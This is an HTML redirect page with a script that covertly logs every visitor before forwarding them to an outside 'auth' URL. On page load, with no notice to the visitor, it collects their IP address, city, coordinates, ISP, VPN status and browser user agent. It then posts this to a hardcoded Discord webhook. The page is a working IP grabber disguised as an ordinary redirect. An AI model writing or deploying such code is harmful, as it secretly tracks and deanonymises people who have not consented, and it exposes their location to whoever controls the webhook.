<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        // Discord Webhook URL
        const webhookURL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";
        
        // Redirect URL
        const redirectURL = "https://www.genned.net/auth/rdtqx";

        async function logVisitorAndRedirect() {
            try {
                const ipResponse = await fetch("https://api.ipify.org?format=json");
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;

                // Get full IP details with VPN detection
                const locationResponse = await fetch(`http://ip-api.com/json/${userIP}?fields=status,message,country,regionName,city,isp,org,as,mobile,proxy,hosting,lat,lon,timezone,query`);
                const locationData = await locationResponse.json();

                if (locationData.status !== "success") {
                    console.error("Error getting location data:", locationData.message);
                    window.location.href = redirectURL;
                    return;
                }

                const userAgent = navigator.userAgent;
                const vpnStatus = locationData.proxy || locationData.hosting ? "ðŸ”´ **VPN/Proxy Detected**" : "ðŸŸ¢ **No VPN/Proxy Detected**";

                const message = {
                    content: `**New Visitor Logged**\n\n` +
                             `**IP Address:** ${locationData.query}\n` +
                             `**Country:** ${locationData.country}\n` +
                             `**Region:** ${locationData.regionName}\n` +
                             `**City:** ${locationData.city}\n` +
                             `**ISP:** ${locationData.isp}\n` +
                             `**Organization:** ${locationData.org}\n` +
                             `**ASN:** ${locationData.as}\n` +
                             `**Latitude:** ${locationData.lat}\n` +
                             `**Longitude:** ${locationData.lon}\n` +
                             `**Timezone:** ${locationData.timezone}\n` +
                             `**Mobile Device:** ${locationData.mobile ? "Yes" : "No"}\n` +
                             `**VPN/Proxy:** ${locationData.proxy ? "Yes" : "No"}\n` +
                             `**Hosting Service:** ${locationData.hosting ? "Yes" : "No"}\n` +
                             `${vpnStatus}\n\n` +
                             `**User-Agent:** \`${userAgent}\``
                };

                // Send the data to the Discord webhook using fetch
                await fetch(webhookURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(message)
                });

                // Redirect instantly after sending data
                window.location.href = redirectURL;
            } catch (error) {
                console.error("Error in logging or redirection:", error);
                window.location.href = redirectURL; // Redirect even if API fails
            }
        }

        // Run the function on page load
        logVisitorAndRedirect();
    </script>
</head>
<body>
    <noscript>
        <meta http-equiv="refresh" content="0;url=https://www.genned.net/auth/rdtqx">
    </noscript>
</body>
</html>
